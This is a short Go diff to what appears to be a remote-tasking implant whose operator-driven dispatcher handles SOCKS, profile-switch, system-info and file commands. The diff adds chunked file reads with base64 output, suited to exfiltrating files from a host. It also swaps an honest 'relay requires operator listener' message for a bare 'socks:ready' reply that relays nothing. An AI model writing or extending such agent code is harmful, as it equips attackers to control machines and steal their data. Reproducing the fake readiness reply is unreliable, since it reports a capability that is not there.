@@ -16,7 +16,14 @@ func runTask(cmd string, args map[string]any) string {
 		return runFileOp(cmd, args)
 	}
 	if cmd == "socks:start" {
-		return "socks:start acknowledged (full relay requires operator SOCKS listener)"
+		// Operator already has local SOCKS broker; agent confirms readiness.
+		return "socks:ready"
+	}
+	if cmd == "profile:switch" {
+		if pid, ok := args["profile_id"].(string); ok {
+			return "profile_switch_ack:" + pid
+		}
+		return "profile_switch_ack"
 	}
 	if cmd == "sysinfo" {
 		return fmt.Sprintf("os=%s arch=%s hostname=%s", runtime.GOOS, runtime.GOARCH, hostName())
@@ -69,7 +76,21 @@ func runFileOp(cmd string, args map[string]any) string {
 		if err != nil {
 			return err.Error()
 		}
-		// chunk hint: base64 for binary safety
+		// optional chunking
+		off := 0
+		if v, ok := args["offset"].(float64); ok {
+			off = int(v)
+		}
+		if off > len(data) {
+			off = len(data)
+		}
+		data = data[off:]
+		if v, ok := args["length"].(float64); ok {
+			n := int(v)
+			if n >= 0 && n < len(data) {
+				data = data[:n]
+			}
+		}
 		if _, ok := args["as_b64"]; ok {
 			return base64.StdEncoding.EncodeToString(data)
 		}
